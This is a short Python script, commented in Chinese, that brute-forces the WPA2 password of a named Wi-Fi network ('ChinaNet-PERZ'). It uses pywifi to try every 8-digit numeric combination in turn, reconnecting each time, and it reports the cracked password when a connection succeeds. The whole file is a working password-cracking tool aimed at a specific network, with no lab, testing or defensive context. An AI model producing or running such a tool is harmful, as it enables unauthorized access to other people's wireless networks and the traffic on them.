import itertools as its
import datetime
# coding:utf-8

import pywifi
from pywifi import const
import time
import datetime


# 测试连接，返回链接结果
def wifiConnect(pwd):
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有连接
    ifaces.disconnect()
    # time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # 要连接WiFi的名称
        profile.ssid = "ChinaNet-PERZ"
        # 网卡的开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码
        profile.key = pwd
        # 删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        # wifi连接时间
        time.sleep(1)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")

    # 读取密码本






# words = '0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.'  # 大小写字母 + 数字 组合
words = '0123456789' # 纯数字
# 生成密码的位数
r = its.product(words, repeat=8)  # 即生成8位密码，正常情况下热点密码位数为8
for i in r:
    tmp=''.join(i)
    try:
        # 一行一行读取
        bool = wifiConnect(tmp)
        if bool:
            print("密码已破解： ", tmp)
            print("WiFi已自动连接！！！")
            break
        else:
            # 跳出当前循环，进行下一次循环
            print("密码破解中....密码校对: ", tmp)
    except:
        continue
    # print(tmp)

